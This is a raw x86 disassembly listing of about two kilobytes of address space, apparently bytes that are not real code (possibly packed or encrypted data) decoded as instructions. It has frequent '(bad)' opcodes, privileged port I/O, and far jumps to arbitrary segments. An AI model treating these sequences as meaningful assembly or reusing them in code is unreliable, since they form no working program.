  42357c:	repz pop esp
  42357e:	sbb    cl,ah
  423580:	xchg   BYTE PTR cs:[esi-0x3206c95b],ah
  423587:	and    BYTE PTR [ebx-0x3d],ah
  42358a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42358b:	mov    DWORD PTR [edx+0x369a3633],eax
  423591:	inc    ecx
  423592:	and    al,0xb9
  423594:	push   edx
  423595:	xchg   esi,eax
  423596:	and    DWORD PTR [edi+0x3612b602],ebx
  42359c:	fbstp  TBYTE PTR [eax+ebp*2-0x3a]
  4235a0:	mov    bh,0x3a
  4235a2:	enter  0x3632,0x32
  4235a6:	enter  0xa70f,0x1a
  4235aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235ab:	(bad)  
  4235ad:	inc    esi
  4235ae:	inc    eax
  4235af:	xor    edx,ebp
  4235b1:	jle    0x423547
  4235b3:	sar    DWORD PTR [eax-0x39bf1a97],0xac
  4235ba:	shl    BYTE PTR [ebx],0xea
  4235bd:	sub    ecx,esi
  4235bf:	pop    es
  4235c0:	daa    
  4235c1:	test   eax,0x9717ea38
  4235c6:	ret    
  4235c7:	in     eax,dx
  4235c8:	in     al,dx
  4235c9:	out    0x16,al
  4235cb:	jl     0x42357d
  4235cd:	jge    0x42355c
  4235cf:	jg     0x42363a
  4235d1:	sub    eax,0x3ddf07a0
  4235d6:	popf   
  4235d7:	(bad)  
  4235d8:	iret   
  4235d9:	ins    DWORD PTR es:[edi],dx
  4235da:	push   0x34
  4235dc:	mov    ch,0x52
  4235de:	mov    al,0x95
  4235e0:	mov    ds:0x179f5d69,eax
  4235e5:	stc    
  4235e6:	bound  ecx,QWORD PTR [edx]
  4235e8:	xchg   ebp,eax
  4235e9:	jo     0x423622
  4235eb:	jmp    0x2fbe:0x1f7e7db8
  4235f2:	xchg   ebx,eax
  4235f3:	jb     0x42366c
  4235f5:	sahf   
  4235f6:	fxam   
  4235f8:	outs   dx,DWORD PTR ds:[esi]
  4235f9:	jg     0x4235a3
  4235fb:	adc    eax,0xf140ba97
  423600:	mov    ax,0xd267
  423604:	and    eax,0x60725251
  423609:	jp     0x42366d
  42360b:	(bad)  
  42360c:	and    dh,al
  42360e:	fld    TBYTE PTR [ebp-0x2e]
  423611:	cmp    BYTE PTR [ecx-0x6c8c8355],0x6f
  423618:	pop    ds
  423619:	mov    ch,0x4a
  42361b:	cwde   
  42361c:	fisub  DWORD PTR [esi+eax*2-0x7705f56c]
  423623:	imul   esp,DWORD PTR [ebp+0x78c2afdf],0x89a5dd7a
  42362d:	dec    ebx
  42362e:	add    BYTE PTR [eax],dh
  423630:	ret    0xe921
  423633:	repz jmp 0x42362e
  423636:	fld    TBYTE PTR [ebx+0x42]
  423639:	icebp  
  42363a:	gs ja  0x42367c
  42363d:	inc    esp
  42363e:	xchg   edx,eax
  42363f:	jg     0x4235f1
  423641:	add    DWORD PTR [eax],eax
  423643:	out    0x1,eax
  423645:	add    BYTE PTR [eax],al
  423647:	push   0xb
  423649:	out    0x4d,al
  42364b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42364c:	call   0x6a35:0x62537c59
  423653:	xchg   esp,eax
  423654:	clc    
  423655:	call   0x2b056a8f
  42365a:	mov    esp,0xa6a3028
  42365f:	jno    0x4235e7
  423661:	jne    0x423639
  423663:	test   eax,0x6471b804
  423668:	jmp    0xa7e7:0x2e5cf8d
  42366f:	fs nop
  423671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423672:	loope  0x4236b4
  423674:	in     al,0xf7
  423676:	test   bl,al
  423678:	scas   eax,DWORD PTR es:[edi]
  423679:	xchg   cl,bh
  42367b:	mov    eax,ds:0x475b121e
  423680:	aad    0x4d
  423682:	jae    0x4236ec
  423684:	(bad)
  423687:	xchg   esp,eax
  423688:	jecxz  0x423656
  42368a:	adc    DWORD PTR [ebp-0x2a0ca767],esi
  423690:	rcl    BYTE PTR [edx+eax*2-0xbf4255b],cl
  423697:	mov    esi,0x134cb3e9
  42369c:	arpl   WORD PTR [ecx+0x7],bp
  42369f:	cmp    DWORD PTR [ebx],0x5d
  4236a2:	mov    ds:0x888f7230,eax
  4236a7:	or     ebx,DWORD PTR [esi-0x2e37dab5]
  4236ad:	mov    eax,0xb9474983
  4236b2:	cld    
  4236b3:	loope  0x423644
  4236b5:	dec    edx
  4236b6:	push   0xd0fb249a
  4236bb:	aad    0x6d
  4236bd:	or     esi,DWORD PTR [edx+edi*8]
  4236c0:	js     0x423703
  4236c2:	dec    ebp
  4236c3:	pop    esp
  4236c4:	fbld   TBYTE PTR [ebx+0xa11512e]
  4236ca:	clc    
  4236cb:	cli    
  4236cc:	gs jmp 0x854:0x90383cf8
  4236d4:	or     BYTE PTR [esi+eax*8+0x267dcd31],dh
  4236db:	enter  0xe0ab,0x9d
  4236df:	paddsb mm3,mm0
  4236e2:	dec    esi
  4236e3:	pop    eax
  4236e4:	push   edx
  4236e5:	popa   
  4236e6:	sub    ebx,DWORD PTR [edi]
  4236e8:	cld    
  4236e9:	xor    ebp,DWORD PTR [esi+esi*4]
  4236ec:	mov    ch,0x26
  4236ee:	mov    dl,0x73
  4236f0:	sbb    BYTE PTR [esi],bl
  4236f2:	ror    DWORD PTR [ebp+0xce3420c],cl
  4236f8:	adc    al,0xe2
  4236fa:	(bad)  
  4236fb:	sbb    bl,BYTE PTR [ecx+0xe]
  4236fe:	sbb    ch,BYTE PTR [eax+0x53]
  423701:	fstp   QWORD PTR [edi-0x317af25]
  423707:	mov    WORD PTR [ebx-0x28],ss
  42370a:	or     DWORD PTR [ebp-0x2663cb10],edx
  423710:	pop    esp
  423711:	xchg   ecx,eax
  423712:	repnz aam 0x53
  423715:	inc    ecx
  423716:	push   edx
  423717:	repnz fmul DWORD PTR [ebx-0x7b]
  42371b:	frstor [ebp+0x58da6bb8]
  423721:	cld    
  423722:	mov    ebp,0x1140ca85
  423727:	dec    esp
  423728:	dec    edi
  423729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42372a:	inc    esp
  42372b:	sbb    DWORD PTR [edi+0x4790ad08],0x65f34fd6
  423735:	pusha  
  423736:	(bad)  
  423737:	aas    
  423738:	pcmpeqw mm1,QWORD PTR [ecx]
  42373b:	sub    ebp,esp
  42373d:	push   0x83808366
  423742:	inc    esp
  423743:	cli    
  423744:	dec    eax
  423745:	mov    ds:0xc454376c,al
  42374a:	lock jl 0x4236dd
  42374d:	mov    ecx,0x1505347e
  423752:	xor    ah,cl
  423754:	clc    
  423755:	push   esi
  423756:	add    BYTE PTR [ebx+eiz*8-0x73],dl
  42375a:	push   0x7b
  42375c:	mov    dh,0xb5
  42375e:	retf   0x527f
  423761:	add    eax,0xf8a14437
  423766:	lahf   
  423767:	xor    eax,DWORD PTR ds:0x30f8629b
  42376d:	out    dx,eax
  42376e:	lahf   
  42376f:	dec    edx
  423770:	cmp    DWORD PTR [eax],esp
  423772:	std    
  423773:	mov    ebp,0xa2fdea0b
  423778:	(bad)  
  423779:	mov    ebx,0xd7f1b21a
  42377e:	adc    cl,0x38
  423781:	pop    edx
  423782:	lods   al,BYTE PTR ds:[esi]
  423783:	sahf   
  423784:	enter  0x4dbb,0x79
  423788:	pushf  
  423789:	sub    al,0x8e
  42378b:	xor    dl,BYTE PTR cs:[ebp-0x2c]
  42378f:	int    0xe6
  423791:	lahf   
  423792:	fdivp  st(2),st
  423794:	shl    BYTE PTR [esi+0x3ce567db],0x50
  42379b:	pop    es
  42379c:	adc    BYTE PTR [ebx+eax*1-0x609545d],ch
  4237a3:	retf   
  4237a4:	int3   
  4237a5:	test   eax,0xcd8132be
  4237aa:	cmp    edi,DWORD PTR [ebx-0x2f39a64b]
  4237b0:	jmp    0xe4e2:0x32e0d7f0
  4237b7:	jge    0x4237f0
  4237b9:	repnz xchg edx,eax
  4237bb:	jne    0x423806
  4237bd:	push   0xffe2bdb
  4237c2:	fucom  st(3)
  4237c4:	loop   0x4237b5
  4237c6:	xchg   esp,eax
  4237c7:	adc    eax,0x93aa129d
  4237cc:	aam    0xe9
  4237ce:	cmp    ecx,DWORD PTR [ecx+0x57]
  4237d1:	mov    WORD PTR [ebp-0x2d],gs
  4237d4:	(bad)  
  4237d5:	call   0xe59c:0x6c56cc59
  4237dc:	push   esi
  4237dd:	mov    al,BYTE PTR [edi]
  4237df:	add    DWORD PTR [ebp+0x177835fd],0xdb4597c4
  4237e9:	xor    al,0x78
  4237eb:	xchg   ebx,eax
  4237ec:	pop    es
  4237ed:	jo     0x4237e8
  4237ef:	pop    esi
  4237f0:	cmc    
  4237f1:	mov    DWORD PTR [edx-0x5c],0xed239d90
  4237f8:	sti    
  4237f9:	xlat   BYTE PTR ds:[ebx]
  4237fa:	sbb    DWORD PTR [ecx+0xe],ebx
  4237fd:	add    BYTE PTR [eax-0x32bac213],0x5e
  423804:	rcl    DWORD PTR [edx-0x33],cl
  423807:	mov    ebp,cs
  423809:	push   ebp
  42380a:	mov    eax,0x92c5d6d8
  42380f:	shr    BYTE PTR [esi-0x14],1
  423812:	sub    bh,BYTE PTR [eax]
  423814:	nop
  423815:	mov    ebx,0x3c2e87ff
  42381a:	inc    ecx
  42381b:	mov    ?,WORD PTR [esi]
  42381d:	gs xchg esi,eax
  42381f:	loope  0x4237e6
  423821:	mov    al,0x53
  423823:	scas   eax,DWORD PTR es:[edi]
  423824:	jns    0x4237bc
  423826:	sub    BYTE PTR [eax+0x53],bh
  423829:	mov    ebp,DWORD PTR ds:[edx*1+0x54200ff]
  423831:	and    BYTE PTR [eax+0x67],ah
  423834:	gs inc edx
  423836:	daa    
  423837:	or     eax,ecx
  423839:	push   esp
  42383a:	jo     0x423872
  42383c:	or     ebx,DWORD PTR [ecx-0x32]
  42383f:	data16 mov dl,0x1
  423842:	add    bh,ah
  423844:	add    DWORD PTR [eax],eax
  423846:	add    bl,cl
  423848:	add    esp,DWORD PTR [edi]
  42384a:	cwde   
  42384b:	push   eax
  42384c:	dec    esp
  42384d:	outs   dx,BYTE PTR ds:[esi]
  42384e:	test   eax,0x59e216a7
  423853:	or     al,0x8d
  423855:	pop    edi
  423856:	sti    
  423857:	or     BYTE PTR [esp+edi*8],ch
  42385a:	mov    eax,eax
  42385c:	xchg   ch,dh
  42385e:	imul   esp,edi,0x913d6fd2
  423864:	pop    ds
  423865:	and    cl,BYTE PTR [esi-0x50f64e7f]
  42386b:	setb   ah
  42386e:	in     al,0x51
  423870:	mov    edi,cs
  423872:	lods   al,BYTE PTR ds:[esi]
  423873:	pop    edx
  423874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423875:	out    0x21,al
  423877:	sbb    eax,0xd8b6c9b
  42387c:	fistp  WORD PTR [edi]
  42387e:	add    BYTE PTR [ebp+0x74781de2],cl
  423884:	mov    bh,0x42
  423886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423887:	test   DWORD PTR [eax+0x11a1e1c5],esi
  42388d:	jns    0x4238a2
  42388f:	inc    esp
  423890:	mov    gs,WORD PTR [esi-0x5bd8595f]
  423896:	ficomp WORD PTR [bx+0xb03]
  42389b:	lods   eax,DWORD PTR ds:[esi]
  42389c:	mov    eax,0x59817b
  4238a1:	push   0x59
  4238a3:	add    DWORD PTR [eax],edx
  4238a5:	mov    edx,0xb79e9ab1
  4238aa:	sub    bh,bh
  4238ac:	jne    0x4238d5
  4238ae:	xor    cl,BYTE PTR [esi]
  4238b0:	mov    edx,0x28b86269
  4238b5:	push   ss
  4238b6:	jae    0x42384c
  4238b8:	push   ss
  4238b9:	retf   0x1ea6
  4238bc:	fstp   TBYTE PTR [edi+0x1fe49749]
  4238c2:	inc    edi
  4238c3:	or     DWORD PTR [edi+0x24],edi
  4238c6:	cdq    
  4238c7:	or     al,0xdf
  4238c9:	ja     0x4238a3
  4238cb:	jns    0x42386e
  4238cd:	imul   ecx,DWORD PTR [eax],0xcaeef9b9
  4238d3:	lods   eax,DWORD PTR ds:[esi]
  4238d4:	fcmove st,st(3)
  4238d6:	loopne 0x42389d
  4238d8:	popa   
  4238d9:	loope  0x4238e6
  4238db:	mov    ebp,DWORD PTR [ebx]
  4238dd:	int    0x78
  4238df:	pop    es
  4238e0:	arpl   WORD PTR ds:0xed78bd28,bp
  4238e6:	in     al,0x24
  4238e8:	cli    
  4238e9:	cmc    
  4238ea:	adc    cl,dh
  4238ec:	pop    esi
  4238ed:	jno    0x42396d
  4238ef:	push   eax
  4238f0:	adc    BYTE PTR [edi+ebp*4],ch
  4238f3:	int    0xa9
  4238f5:	repz jbe 0x42388d
  4238f8:	pop    edx
  4238f9:	sar    bl,1
  4238fb:	xchg   edx,eax
  4238fc:	(bad)  
  4238fd:	outs   dx,DWORD PTR ds:[esi]
  4238fe:	or     al,0xd2
  423900:	jmp    0x656b:0x958744b
  423907:	push   0xe4f42a5c
  42390c:	adc    BYTE PTR [eax+0x3c],0x1e
  423910:	test   DWORD PTR [esi],0x7bf025b8
  423916:	stos   DWORD PTR es:[edi],eax
  423917:	dec    esi
  423918:	out    0x33,al
  42391a:	sbb    ebp,DWORD PTR [ecx]
  42391c:	dec    edi
  42391d:	or     DWORD PTR [ebx+0x421ecfb5],0x9
  423924:	loopne 0x42396f
  423926:	(bad)  
  423927:	push   ds
  423928:	pop    eax
  423929:	adc    dh,BYTE PTR [eax-0x17580a87]
  42392f:	sub    al,0x55
  423931:	cld    
  423932:	lds    eax,FWORD PTR [edi-0x18]
  423935:	inc    eax
  423936:	ins    BYTE PTR es:[edi],dx
  423937:	mov    edx,0xe6e7814a
  42393c:	mov    edi,0x30b45c1e
  423941:	out    0xd6,eax
  423943:	and    eax,0x20ba7534
  423948:	sub    eax,0x99db723d
  42394d:	ret    
  42394e:	or     BYTE PTR [esi+ecx*2+0x80deecc],0xf5
  423956:	cdq    
  423957:	mov    ecx,0x89d8a1c9
  42395c:	fcomp  QWORD PTR [ecx+ebx*1+0x20f78595]
  423963:	jns    0x42398d
  423965:	mov    bl,0x84
  423967:	inc    ecx
  423968:	ret    0x870e
  42396b:	dec    ebp
  42396c:	aam    0x49
  42396e:	add    dl,BYTE PTR [ebx+edi*1+0x6e4d6c68]
  423975:	xlat   BYTE PTR ds:[ebx]
  423976:	rcr    DWORD PTR [eax+0x6b],cl
  423979:	and    bh,bh
  42397b:	xor    al,0x25
  42397d:	leave  
  42397e:	pop    ebp
  42397f:	adc    eax,0xf2a95ca5
  423984:	add    ebx,DWORD PTR [ebx+0x464eac4b]
  42398a:	mov    ds:0x1fcadd32,eax
  42398f:	and    al,0x93
  423991:	adc    eax,0xd466f253
  423996:	xchg   ebp,eax
  423997:	adc    al,0xe
  423999:	leave  
  42399a:	outs   dx,DWORD PTR ds:[esi]
  42399b:	sti    
  42399c:	loop   0x4239fc
  42399e:	out    dx,eax
  42399f:	loope  0x423a14
  4239a1:	jl     0x423a1f
  4239a3:	arpl   dx,di
  4239a5:	mov    dh,0x64
  4239a7:	nop
  4239a8:	mov    ch,0xf2
  4239aa:	inc    ecx
  4239ab:	cmp    al,0x9d
  4239ad:	dec    edi
  4239ae:	sub    DWORD PTR [esi+edi*8-0x61a85cfc],esp
  4239b5:	(bad)  
  4239b6:	or     eax,esp
  4239b8:	sahf   
  4239b9:	fs cmp al,0xf5
  4239bc:	or     eax,0x9b200e31
  4239c1:	sub    DWORD PTR [eax],ebp
  4239c3:	xchg   edx,eax
  4239c4:	cmp    DWORD PTR [edi-0x34d8906b],ecx
  4239ca:	enter  0xade8,0xbf
  4239ce:	sbb    ch,BYTE PTR [edx-0x7fe40a09]
  4239d4:	lea    eax,[edi-0x72321719]
  4239da:	mov    ecx,0x9032f887
  4239df:	or     ecx,DWORD PTR [edi-0x7]
  4239e2:	ins    DWORD PTR es:[edi],dx
  4239e3:	mov    BYTE PTR [esi+0xae70576],bh
  4239e9:	pop    es
  4239ea:	hlt    
  4239eb:	jae    0x4239c1
  4239ed:	pop    edi
  4239ee:	push   ds
  4239ef:	push   eax
  4239f0:	ds xor al,0xe7
  4239f3:	into   
  4239f4:	enter  0xa251,0x35
  4239f8:	inc    edx
  4239f9:	cmp    bl,al
  4239fb:	ret    0xff64
  4239fe:	pop    ss
  4239ff:	int    0x18
  423a01:	push   eax
  423a02:	(bad)  
  423a03:	pop    esi
  423a04:	xchg   BYTE PTR [ebp*8+0x26646ecc],cl
  423a0b:	in     al,0xab
  423a0d:	jne    0x423a05
  423a0f:	cmp    al,0xf4
  423a11:	sub    BYTE PTR [eax+0x75a0a065],0xe3
  423a18:	sbb    al,0x12
  423a1a:	adc    cl,BYTE PTR [edx-0x78]
  423a1d:	arpl   WORD PTR [esi+eiz*1],bp
  423a20:	int    0x60
  423a22:	ret    
  423a23:	sbb    al,0x8f
  423a25:	jno    0x423a84
  423a27:	push   cs
  423a28:	sbb    BYTE PTR [eax],0x1e
  423a2b:	outs   dx,BYTE PTR ds:[esi]
  423a2c:	mov    ds:0x2fbf0001,al
  423a31:	sbb    al,0x80
  423a33:	pushf  
  423a34:	mov    bl,0xbf
  423a36:	aas    
  423a37:	dec    esp
  423a38:	lahf   
  423a39:	mov    esp,0x26b495bc
  423a3e:	jp     0x423a8d
  423a40:	mov    ah,0x1
  423a42:	add    bh,ah
  423a44:	add    DWORD PTR [eax],eax
  423a46:	add    BYTE PTR [edi+0x750425c6],cl
  423a4c:	cmc    
  423a4d:	sub    eax,0x53390a2
  423a52:	push   edi
  423a53:	jge    0x4239e3
  423a55:	mov    dl,0xec
  423a57:	xor    DWORD PTR [edi+0x51],edi
  423a5a:	cmp    eax,0x7538a7fa
  423a5f:	fs inc ebx
  423a61:	jmp    0x2245d3ec
  423a66:	out    dx,al
  423a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a68:	push   ecx
  423a69:	ficomp WORD PTR [eax]
  423a6b:	lods   eax,DWORD PTR ds:[esi]
  423a6c:	push   ecx
  423a6d:	shl    DWORD PTR [esi+0x53],0x3c
  423a71:	jno    0x423a12
  423a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a74:	xchg   ecx,eax
  423a75:	jmp    0x73f7:0x5ff13e4f
  423a7c:	pop    ebp
  423a7d:	outs   dx,BYTE PTR gs:[esi]
  423a7f:	pop    ss
  423a80:	push   ebp
  423a81:	mov    dl,BYTE PTR [edi-0x14362ec2]
  423a87:	aas    
  423a88:	scas   al,BYTE PTR es:[edi]
  423a89:	(bad)  
  423a8a:	stc    
  423a8b:	xor    ebx,esi
  423a8d:	xor    eax,0xe6fe8d4c
  423a92:	sub    eax,0xcd6715e3
  423a97:	sub    esp,ebx
  423a99:	mov    dh,0x24
  423a9b:	mov    ah,0x7f
  423a9d:	pop    edx
  423a9e:	out    0x18,al
  423aa0:	nop
  423aa1:	dec    BYTE PTR [ecx+0x17]
  423aa4:	xor    al,0x3b
  423aa6:	cdq    
  423aa7:	add    ecx,DWORD PTR [eax+0x42]
  423aaa:	out    0xdd,al
  423aac:	sub    DWORD PTR [eax+0x5f],esi
  423aaf:	and    al,0x7e
  423ab1:	ds jmp 0x218785d0
  423ab7:	mov    edx,0xbf7b3d66
  423abc:	add    BYTE PTR [ebp+0x17],bh
  423abf:	sub    BYTE PTR [edx+0x75],0x3f
  423ac3:	call   0x1e39:0x5901a947
  423aca:	repz ds jmp 0x423a74
  423ace:	lock sbb DWORD PTR [eax],ebx
  423ad1:	adc    eax,0x8f44684
  423ad6:	mov    esi,0xd10a8d87
  423adb:	jnp    0x423b07
  423add:	pop    esi
  423ade:	addr16 fucomp st(7)
  423ae1:	pop    es
  423ae2:	dec    edi
  423ae3:	loopne 0x423b56
  423ae5:	sbb    DWORD PTR [ebp-0x63364065],esp
  423aeb:	jl     0x423ae6
  423aed:	repnz mov ecx,0xf3ecfc09
  423af3:	jge    0x423b21
  423af5:	jecxz  0x423ac1
  423af7:	add    eax,0x3416793f
  423afc:	add    edx,DWORD PTR [esi]
  423afe:	fisttp QWORD PTR [ebx+0x18]
  423b01:	sbb    edi,DWORD PTR [ebx-0x180bb225]
  423b07:	shl    DWORD PTR [ebp+0x158c1f3f],1
  423b0d:	inc    ebx
  423b0e:	push   edx
  423b0f:	adc    BYTE PTR [edi],dh
  423b11:	jecxz  0x423b15
  423b13:	enter  0xe8ea,0xf4
  423b17:	retf   0xcae7
  423b1a:	loop   0x423b78
  423b1c:	jbe    0x423b88
  423b1e:	es leave 
  423b20:	cmp    BYTE PTR [ecx],dl
  423b22:	rcr    ebx,cl
  423b24:	fstp   QWORD PTR [esi+0x5f]
  423b27:	cmp    eax,0x28822cb1
  423b2c:	or     eax,0x6bc48a41
  423b31:	nop
  423b32:	push   es
  423b33:	fdivr  QWORD PTR [ecx+0x568e2d38]
  423b39:	xlat   BYTE PTR ds:[ebx]
  423b3a:	aam    0xf
  423b3c:	and    BYTE PTR [edi-0x1e1ed2e6],dl
  423b42:	imul   BYTE PTR [esi+0x565e699f]
  423b48:	mov    ah,BYTE PTR [edx-0x3acebf92]
  423b4e:	dec    eax
  423b4f:	ja     0x423bae
  423b51:	std    
  423b52:	inc    ecx
  423b53:	xchg   edx,eax
  423b54:	js     0x423b9c
  423b56:	jp     0x423bc5
  423b58:	or     bh,BYTE PTR [eax]
  423b5a:	shl    ebx,1
  423b5c:	xchg   esi,eax
  423b5d:	inc    edx
  423b5e:	stos   BYTE PTR es:[edi],al
  423b5f:	in     al,dx
  423b60:	fbstp  TBYTE PTR [edx]
  423b62:	or     DWORD PTR ds:0xe8dba455,0x7a2afa9c
  423b6c:	mov    ch,0x13
  423b6e:	into   
  423b6f:	cmc    
  423b70:	(bad)  
  423b71:	or     eax,0x77678138
  423b76:	lds    edi,FWORD PTR [edx+0x4e]
  423b79:	sbb    BYTE PTR [edx+0x17],0xf6
  423b7d:	fnstcw WORD PTR [edx]
  423b7f:	sub    DWORD PTR [edx+0x7be89a75],eax
  423b85:	es call 0xbe7f:0x5708c903
  423b8d:	sub    al,0xa2
  423b8f:	mov    esi,0x40b47d4a
  423b94:	xor    al,0x3a
  423b96:	push   cs
  423b97:	xchg   esi,eax
  423b98:	and    al,bl
  423b9a:	test   DWORD PTR [ecx-0x2e],eax
  423b9d:	fcmovnu st,st(4)
  423b9f:	sbb    BYTE PTR [ecx+0x786e213],0xb5
  423ba6:	bound  edx,QWORD PTR [eax+0x2]
  423ba9:	jb     0x423bc1
  423bab:	mov    cl,0x84
  423bad:	mov    ebx,0x9287d5ea
  423bb2:	lods   al,BYTE PTR ds:[esi]
  423bb3:	push   ss
  423bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bb6:	loop   0x423c0b
  423bb8:	ja     0x423bf4
  423bba:	dec    esi
  423bbb:	push   edi
  423bbc:	sbb    DWORD PTR [ecx],edi
  423bbe:	sar    DWORD PTR [edi-0x64],cl
  423bc1:	stc    
  423bc2:	pop    ds
  423bc3:	inc    eax
  423bc4:	lahf   
  423bc5:	clc    
  423bc6:	stc    
  423bc7:	inc    ecx
  423bc8:	xor    BYTE PTR [edi],bl
  423bca:	repnz aam 0xf3
  423bcd:	mov    WORD PTR [edi+0x69],?
  423bd0:	bound  esp,QWORD PTR [eax+0x49]
  423bd3:	lea    edi,[ebp+0x44]
  423bd6:	imul   eax,DWORD PTR [edi+0x22],0x35d4b690
  423bdd:	imul   eax,DWORD PTR [eax-0x626bebdd],0x7b
  423be4:	fmul   st(4),st
  423be6:	scas   eax,DWORD PTR es:[edi]
  423be7:	pop    edi
  423be8:	nop
  423be9:	cmp    al,0x16
  423beb:	retf   0x7298
  423bee:	mov    ch,0xc1
  423bf0:	inc    DWORD PTR es:[eax-0x6c]
  423bf4:	aaa    
  423bf5:	push   eax
  423bf6:	push   ecx
  423bf7:	xor    al,0x7b
  423bf9:	(bad)  
  423bfa:	cmp    al,0x15
  423bfc:	stc    
  423bfd:	inc    ebp
  423bfe:	retf   0xd16b
  423c01:	push   esi
  423c02:	retf   0xd50c
  423c05:	pop    ss
  423c06:	push   ebx
  423c07:	cmp    DWORD PTR [eax+0x3e],esp
  423c0a:	push   cs
  423c0b:	mov    ecx,0x7d71a1d4
  423c10:	pop    ss
  423c11:	xor    edi,DWORD PTR [eax-0x2c]
  423c14:	jnp    0x423c0c
  423c16:	(bad)
  423c1a:	shl    BYTE PTR [eax],0xa6
  423c1d:	imul   ebx,DWORD PTR [ebp-0x6fd919b4],0x38523207
  423c27:	es out dx,al
  423c29:	div    BYTE PTR [ebx-0x67]
  423c2c:	sub    eax,0xb48900e9
  423c31:	mov    dh,0xf3
  423c33:	mov    edi,0xe9fecdf3
  423c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c39:	mov    ah,BYTE PTR [ebx]
  423c3b:	mov    ebp,0x34bf586b
  423c40:	mov    dh,0x1
  423c42:	add    bh,ah
  423c44:	add    DWORD PTR [eax],eax
  423c46:	add    BYTE PTR [eax+0xf510f04],cl
  423c4c:	sub    dh,dl
  423c4e:	jmp    0x5b2de879
  423c53:	mov    edi,0xb2925189
  423c58:	xchg   BYTE PTR [edi+esi*1+0x65],bh
  423c5c:	retf   
  423c5d:	test   eax,0xe4babe46
  423c62:	sbb    al,0x2e
  423c64:	gs mov edx,0x3220691
  423c6a:	repz jo 0x423bf4
  423c6d:	(bad)  
  423c6e:	mov    ebp,0x6904d2cb
  423c73:	(bad)  
  423c74:	fmul   DWORD PTR [edi]
  423c76:	cmp    BYTE PTR [esi-0x2f10f6cb],dl
  423c7c:	cmp    dl,BYTE PTR [eax]
  423c7e:	mov    ecx,0xc7ef2796
  423c83:	mov    dh,0xb6
  423c85:	das    
  423c86:	and    DWORD PTR [eax],edi
  423c88:	mov    dl,0x81
  423c8a:	push   ecx
  423c8c:	and    eax,0xf670682
  423c91:	popa   
  423c92:	and    BYTE PTR [ebx+0x37],cl
  423c95:	xchg   ebp,eax
  423c96:	je     0x423c2f
  423c98:	shr    dh,0x39
  423c9b:	xlat   BYTE PTR ds:[ebx]
  423c9c:	stc    
  423c9d:	mov    al,ds:0x6cf2c691
  423ca2:	cmp    edx,esi
  423ca4:	inc    ecx
  423ca5:	into   
  423ca6:	sub    esi,DWORD PTR [edx]
  423ca8:	rol    DWORD PTR ds:0x32c1707a,1
  423cae:	fdiv   DWORD PTR [edi]
  423cb0:	jp     0xfd63df62
  423cb6:	stos   DWORD PTR es:[edi],eax
  423cb7:	xchg   ecx,eax
  423cb8:	push   eax
  423cb9:	jno    0x423d03
  423cbb:	mov    cl,0x30
  423cbd:	xor    BYTE PTR [ebx-0x7f7227ce],dl
  423cc3:	ror    edi,1
  423cc5:	mov    ebp,ebp
  423cc7:	mov    esi,DWORD PTR [eax+ebp*2]
  423cca:	popa   
  423ccb:	mov    esp,0x64d27592
  423cd0:	cld    
  423cd1:	push   eax
  423cd2:	push   ecx
  423cd3:	icebp  
  423cd4:	inc    ebx
  423cd5:	stc    
  423cd6:	mov    esp,0x98ec8967
  423cdb:	adc    BYTE PTR [ebx],ch
  423cdd:	mov    bh,0x60
  423cdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ce0:	sbb    al,BYTE PTR [ecx+esi*4-0x75]
  423ce4:	je     0x423d5b
  423ce6:	jecxz  0x423cf5
  423ce8:	lods   al,BYTE PTR ds:[esi]
  423ce9:	test   BYTE PTR [esi+0xb],ah
  423cec:	jecxz  0x423d35
  423cee:	inc    ebp
  423cef:	cmp    eax,0xd419e35e
  423cf4:	and    eax,0x7d308509
  423cf9:	xchg   ebp,eax
  423cfa:	sub    eax,0xd45f5bf5
  423cff:	mov    esp,0xa1251677
  423d04:	in     eax,0x93
  423d06:	cwde   
  423d07:	rol    BYTE PTR [eax],0xa1
  423d0a:	dec    esi
  423d0b:	jne    0x423cc6
  423d0d:	push   esi
  423d0e:	dec    esp
  423d0f:	dec    ebp
  423d10:	test   BYTE PTR [ecx+0x7c],dh
  423d13:	xor    al,0xf4
  423d15:	shl    BYTE PTR [ebp-0x2f217048],0x61
  423d1c:	or     al,ah
  423d1e:	push   es
  423d1f:	aam    0xdd
  423d21:	inc    ebp
  423d22:	push   ebx
  423d23:	push   ebx
  423d24:	dec    esp
  423d25:	mov    bl,0xf
  423d27:	mov    al,ds:0x4e89976f
  423d2c:	pop    ebx
  423d2d:	ins    DWORD PTR es:[edi],dx
  423d2e:	adc    BYTE PTR [eax+0x61f74030],0x5
  423d35:	aam    0xc9
  423d37:	add    DWORD PTR [esi+0x5f],esp
  423d3a:	(bad)  
  423d3b:	ds dec edx
  423d3d:	mov    eax,ds:0xb5a886ed
  423d42:	pop    ebx
  423d43:	daa    
  423d44:	pushf  
  423d45:	cmp    BYTE PTR [ecx-0x2a04250e],dh
  423d4b:	dec    eax
  423d4c:	pop    ebx
  423d4d:	jg     0x423dce
  423d4f:	stc    
  423d50:	and    ebx,ebp
  423d52:	pop    es
  423d53:	mul    cl
  423d55:	retf   0x22ff
  423d58:	into   
  423d59:	pop    ebx
  423d5a:	xchg   edi,eax
  423d5b:	adc    eax,0x72d1bc54
  423d60:	mov    al,0xd
  423d62:	(bad)  
  423d63:	outs   dx,DWORD PTR ds:[esi]
  423d64:	jo     0x423d9a
  423d66:	(bad)  
  423d68:	(bad)  
  423d69:	cli    
  423d6a:	adc    edx,ebx
  423d6c:	stc    
  423d6d:	cmp    al,0x88
  423d6f:	icebp  
  423d70:	sub    DWORD PTR [edx+0xe467d99],ebx
  423d76:	daa    
  423d77:	aam    0x8
  423d79:	pop    ecx
  423d7a:	xor    ecx,DWORD PTR [edx]
  423d7c:	(bad)  [esi-0xa]
  423d7f:	fsub   QWORD PTR [ecx-0x34]
  423d82:	adc    eax,esp
